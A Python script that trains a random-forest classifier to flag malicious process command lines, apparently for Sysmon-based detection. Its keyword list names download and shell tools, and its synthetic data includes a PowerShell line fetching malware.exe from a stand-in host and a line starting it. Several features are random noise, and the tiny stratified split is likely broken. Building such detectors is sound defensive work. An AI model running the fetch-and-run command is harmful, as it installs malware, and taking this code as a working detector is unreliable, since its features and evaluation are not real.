import os
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.metrics import classification_report, accuracy_score
from sklearn.preprocessing import StandardScaler, LabelEncoder
import joblib
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class SysmonModelTrainer:
    def __init__(self):
        self.model = None
        self.scaler = StandardScaler()
        self.label_encoders = {}
        self.feature_columns = [
            'command_length',
            'has_suspicious_keywords',
            'process_name_length',
            'user_name_length',
            'is_system_user',
            'has_network_activity',
            'has_file_operations',
            'has_registry_operations'
        ]
        
    def load_data(self, filepath):
        """
        Load and preprocess training data
        Expected CSV format with columns: ['process_name', 'command_line', 'user', 'is_malicious']
        """
        logger.info(f"Loading data from {filepath}")
        df = pd.read_csv(filepath)
        
        # Basic validation
        required_columns = ['process_name', 'command_line', 'user', 'is_malicious']
        if not all(col in df.columns for col in required_columns):
            raise ValueError(f"Missing required columns. Expected: {required_columns}")
            
        return df
    
    def preprocess_data(self, df):
        """Extract features from raw data"""
        logger.info("Preprocessing data...")
        
        # Feature engineering
        df_processed = pd.DataFrame()
        
        # Basic features
        df_processed['command_length'] = df['command_line'].str.len().fillna(0)
        df_processed['process_name_length'] = df['process_name'].str.len().fillna(0)
        df_processed['user_name_length'] = df['user'].str.len().fillna(0)
        
        # Binary features
        suspicious_keywords = ['powershell', 'cmd', 'wget', 'curl', 'invoke-', 'iex', 'download', 'http', 'https']
        df_processed['has_suspicious_keywords'] = df['command_line'].str.lower().str.contains('|'.join(suspicious_keywords), na=False).astype(int)
        df_processed['is_system_user'] = df['user'].str.lower().isin(['system', 'local system', 'nt authority\\system']).astype(int)
        
        # Simulated features (in a real scenario, these would come from Sysmon events)
        df_processed['has_network_activity'] = (np.random.random(size=len(df)) > 0.7).astype(int)
        df_processed['has_file_operations'] = (np.random.random(size=len(df)) > 0.5).astype(int)
        df_processed['has_registry_operations'] = (np.random.random(size=len(df)) > 0.8).astype(int)
        
        # Encode target variable
        self.label_encoders['is_malicious'] = LabelEncoder()
        y = self.label_encoders['is_malicious'].fit_transform(df['is_malicious'])
        
        # Scale features
        X = self.scaler.fit_transform(df_processed[self.feature_columns])
        
        return X, y, df_processed
    
    def train(self, X, y):
        """Train the model"""
        logger.info("Training model...")
        
        # Split data
        X_train, X_test, y_train, y_test = train_test_split(
            X, y, test_size=0.2, random_state=42, stratify=y
        )
        
        # Initialize and train model
        self.model = RandomForestClassifier(
            n_estimators=100,
            max_depth=10,
            random_state=42,
            class_weight='balanced',
            n_jobs=-1
        )
        
        self.model.fit(X_train, y_train)
        
        # Evaluate
        y_pred = self.model.predict(X_test)
        accuracy = accuracy_score(y_test, y_pred)
        logger.info(f"Model accuracy: {accuracy:.4f}")
        logger.info("\n" + classification_report(y_test, y_pred))
        
        return accuracy
    
    def save_model(self, output_dir='models'):
        """Save the trained model and preprocessing artifacts"""
        os.makedirs(output_dir, exist_ok=True)
        
        # Save model
        model_path = os.path.join(output_dir, 'model.pkl')
        joblib.dump({
            'model': self.model,
            'feature_columns': self.feature_columns,
            'label_encoders': self.label_encoders,
            'scaler': self.scaler,
            'timestamp': datetime.utcnow().isoformat(),
            'model_type': 'RandomForestClassifier'
        }, model_path)
        
        logger.info(f"Model saved to {model_path}")
        return model_path

def main():
    try:
        # Initialize trainer
        trainer = SysmonModelTrainer()
        
        # Load and preprocess data
        # Note: In a real scenario, you would load your actual training data
        # For now, we'll create a small synthetic dataset
        data = {
            'process_name': ['cmd.exe', 'powershell.exe', 'chrome.exe', 'suspicious.exe'],
            'command_line': [
                'whoami',
                'Invoke-WebRequest -Uri http://malicious.com/malware.exe -OutFile malware.exe',
                'chrome --new-tab https://google.com',
                'start /B malware.exe'
            ],
            'user': ['SYSTEM', 'Administrator', 'User', 'SYSTEM'],
            'is_malicious': [0, 1, 0, 1]
        }
        df = pd.DataFrame(data)
        
        # Preprocess data
        X, y, _ = trainer.preprocess_data(df)
        
        # Train model
        trainer.train(X, y)
        
        # Save model
        trainer.save_model('backend/ml_model')
        
        logger.info("Model training completed successfully!")
        
    except Exception as e:
        logger.error(f"Error during model training: {str(e)}", exc_info=True)
        raise

if __name__ == "__main__":
    main()
